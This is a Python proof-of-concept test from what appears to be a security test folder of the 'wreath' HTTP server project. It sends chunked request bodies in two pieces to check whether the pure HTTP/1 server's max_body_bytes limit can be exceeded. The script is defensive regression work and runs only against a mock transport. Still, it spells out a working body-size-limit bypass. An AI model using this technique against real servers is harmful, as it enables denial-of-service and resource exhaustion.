"""PoC: bypass ``max_body_bytes`` on the pure HTTP/1 server with slow chunks.

Run from the repository root::

    uv run python tests/security/poc_chunked_body_limit_bypass.py

The configured limit is 10 bytes.  A vulnerable build lets a streaming app
consume two six-byte chunks and answers 200 with the complete 12-byte body.
"""

from __future__ import annotations

import asyncio
from typing import Any

from wreath._pure.server import HttpProtocol
from wreath.server import ServerConfig


class Transport(asyncio.Transport):
    def __init__(self) -> None:
        super().__init__()
        self.buffer = bytearray()
        self.closed = False

    def write(self, data: Any) -> None:
        if not self.closed:
            self.buffer += data

    def close(self) -> None:
        self.closed = True

    def abort(self) -> None:
        self.closed = True

    def is_closing(self) -> bool:
        return self.closed

    def get_extra_info(self, name: str, default: Any = None) -> Any:
        return {
            "sockname": ("127.0.0.1", 8000),
            "peername": ("127.0.0.1", 54321),
        }.get(name, default)


async def _echo(scope: dict, receive: Any, send: Any) -> None:
    body = bytearray()
    while True:
        message = await receive()
        body += message.get("body", b"")
        if not message.get("more_body", False):
            break
    await send({"type": "http.response.start", "status": 200})
    await send({"type": "http.response.body", "body": bytes(body)})


async def _main() -> int:
    loop = asyncio.get_running_loop()
    transport = Transport()
    protocol = HttpProtocol(
        _echo,
        ServerConfig(max_body_bytes=10),
        loop,
        set(),
    )
    protocol.connection_made(transport)
    protocol.data_received(
        b"POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n"
        b"6\r\n123456\r\n"
    )
    for _ in range(5):
        await asyncio.sleep(0)
    protocol.data_received(b"6\r\nabcdef\r\n0\r\n\r\n")
    for _ in range(5):
        await asyncio.sleep(0)

    response = bytes(transport.buffer)
    status = response.partition(b"\r\n")[0]
    vulnerable = status == b"HTTP/1.1 200 OK" and response.endswith(b"123456abcdef")
    print(status.decode("ascii", "replace"))
    print("VULNERABLE: accepted 12 bytes with a 10-byte limit" if vulnerable else "not vulnerable")
    return 0 if vulnerable else 1


if __name__ == "__main__":
    raise SystemExit(asyncio.run(_main()))
